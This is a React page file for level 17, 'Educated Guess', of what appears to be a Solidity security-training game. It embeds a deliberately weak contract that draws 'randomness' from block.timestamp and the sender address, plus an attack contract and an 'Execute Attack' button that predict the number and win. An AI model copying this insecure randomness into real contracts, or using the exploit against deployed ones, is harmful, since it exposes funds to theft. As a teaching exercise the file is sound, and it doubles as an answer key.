// src/pages/Game17.js

import React from 'react';
import GameTemplateCard from '../../components/GameTemplateCard';
import InstanceABI from '../../interfaces/EducatedGuess.json';
import InstanceABI2 from '../../interfaces/EducatedGuessHack.json';
import { random, correctGuess, attack, checkEducatedGuess } from '../../functions/Game17Functions';

const gameData17 = {
  id: 17,
  title: 'Educated Guess',
  description: `Navigate Solidity's number generation. Track and master the art of randomness. 
                You need to find a way to track the process of generating a random number in Solidity.`,
  code: `// SPDX-License-Identifier: MIT
          pragma solidity ^0.8.10;

          contract EducatedGuess {
              bool public correctGuess;

              function random(uint256 guess) public {
                  uint256 randomnumber = uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender))) % 1000;
                  require(guess == randomnumber, "Your guess is incorrect");
                  correctGuess = true;
              }
          }

          contract HackEducatedGuess {
              EducatedGuess target;

              function attack(address _target, address attackerContract, uint num) public returns (uint256) {
                  target = EducatedGuess(_target);
                  uint256 _randomnumber = uint256(keccak256(abi.encodePacked(block.timestamp, attackerContract))) % num;
                  target.random(_randomnumber);
                  return _randomnumber;
              }
          }`,
  abi: InstanceABI,
  abi2: InstanceABI2,
  badgeId: 17,
  hint: 'Consider how external factors, such as the block.timestamp, can influence the generation of a "random" number.',
  functions: [
    {
      label: 'Check Correct Guess',
      functionName: 'correctGuess',
      buttonText: 'Fetch Correct Guess',
      inputs: [],
    },
    {
      label: 'Send Guess',
      functionName: 'random',
      buttonText: 'Submit Guess',
      inputs: [{ name: 'Gusess', placeholder: 'Enter your guess' }],
    },
    {
      label: 'Attack Educated Guess',
      functionName: 'attack',
      buttonText: 'Execute Attack',
      inputs: [
        { name: 'Target', placeholder: 'Enter Target Address' },
        { name: 'attackerContract', placeholder: 'Enter Attacker Contract Address' },
        { name: 'Num', placeholder: 'Enter Number for Attack' },
      ],
    },
    {
      label: 'Check Educated Guess Status',
      functionName: 'checkEducatedGuess',
      buttonText: 'Submit',
      inputs: [],
    },
  ],
};

const Game17 = () => (
  <GameTemplateCard
    gameData={gameData17}
    gameFunctions={{
      random,
      correctGuess,
      attack,
      checkEducatedGuess,
    }}
  />
);

export default Game17;
